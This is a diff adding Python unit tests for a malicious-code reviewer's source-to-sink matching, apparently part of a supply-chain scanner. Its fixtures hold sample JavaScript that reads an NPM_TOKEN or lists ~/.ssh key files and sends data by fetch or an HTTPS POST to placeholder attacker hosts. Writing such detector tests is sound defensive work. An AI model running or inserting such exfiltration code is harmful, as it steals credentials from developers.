@@ -210,3 +210,24 @@ def test_a_directory_require_links_the_files_in_it():
     d = reviewer.apply_chain_gate(_q("const s = process.env.NPM_TOKEN;",
                                      "fetch('https://c.example.invalid', { body: s })"), _input(files))
     assert d["classification"] == "malicious", d["reasoning"]
+
+
+def test_a_multi_line_quote_that_skips_a_comment_line_still_matches():
+    files = {"setup.js": ["const dir = path.join(os.homedir(), '.ssh');",
+                          "// list the key files",
+                          "return fs.readdirSync(dir).filter(f => f.endsWith('.pub'));",
+                          "const req = https.request({",
+                          "  hostname: '192.0.2.10', // attacker host",
+                          "  method: 'POST',"]}
+    d = reviewer.apply_chain_gate(
+        _q("const dir = path.join(os.homedir(), '.ssh');\nreturn fs.readdirSync(dir).filter(f => f.endsWith('.pub'));",
+           "const req = https.request({\n  hostname: '192.0.2.10',\n  method: 'POST',"), _input(files))
+    assert d["classification"] == "malicious", d["reasoning"]
+
+
+def test_quote_lines_split_across_files_do_not_match():
+    files = {"a.js": ["const s = process.env.NPM_TOKEN;"], "b.js": ["fetch('https://c.example.invalid', { body: s });"]}
+    d = reviewer.apply_chain_gate(
+        _q("const s = process.env.NPM_TOKEN;\nfetch('https://c.example.invalid', { body: s });",
+           "fetch('https://c.example.invalid', { body: s });"), _input(files))
+    assert "source is not quoted" in d["reasoning"]
